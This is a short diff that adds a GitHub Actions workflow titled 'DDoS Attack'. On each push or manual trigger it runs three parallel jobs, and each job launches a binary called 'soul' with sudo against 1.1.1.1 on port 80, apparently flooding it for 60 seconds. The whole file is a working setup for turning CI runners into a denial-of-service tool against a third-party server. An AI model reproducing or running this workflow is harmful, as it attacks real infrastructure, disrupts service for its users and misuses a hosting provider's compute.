@@ -1,0 +1,13 @@
+name: DDoS Attack
+on: [push, workflow_dispatch]
+
+jobs:
+    attack:
+        runs-on: ubuntu-22.04
+        strategy:
+            matrix:
+                count: [1,2,3]
+        steps:
+        - uses: actions/checkout@v3
+        - run: chmod +x soul
+        - run: sudo ./soul 1.1.1.1 80 60 999
